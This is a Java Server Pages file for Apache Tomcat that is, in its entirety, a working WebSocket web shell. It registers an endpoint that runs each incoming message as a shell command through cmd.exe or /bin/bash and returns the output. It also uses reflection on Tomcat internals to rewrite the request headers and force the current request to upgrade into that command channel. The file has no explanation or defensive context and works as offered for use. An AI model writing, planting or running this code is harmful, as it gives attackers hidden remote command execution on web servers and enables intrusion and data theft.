<%@ page import="java.util.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.websocket.Endpoint" %>
<%@ page import="javax.websocket.Session" %>
<%@ page import="javax.websocket.EndpointConfig" %>
<%@ page import="javax.websocket.MessageHandler" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%@ page import="org.apache.tomcat.websocket.server.UpgradeUtil" %>
<%@ page import="org.apache.tomcat.util.http.MimeHeaders" %>

<%!
    public static class CmdEndpoint extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
    private void SetHeader(HttpServletRequest request, String key, String value){
        Class<? extends HttpServletRequest> requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj);
            headersObj.removeHeader(key);
            headersObj.addValue(key).setString(value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(CmdEndpoint.class, "/x").build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    Map<String, String> pathParams = Collections.emptyMap();
    SetHeader(request,"Connection","upgrade");
    SetHeader(request,"Sec-WebSocket-Version","13");
    SetHeader(request,"Upgrade","websocket");
    UpgradeUtil.doUpgrade(container, request, response, configEndpoint, pathParams);
%>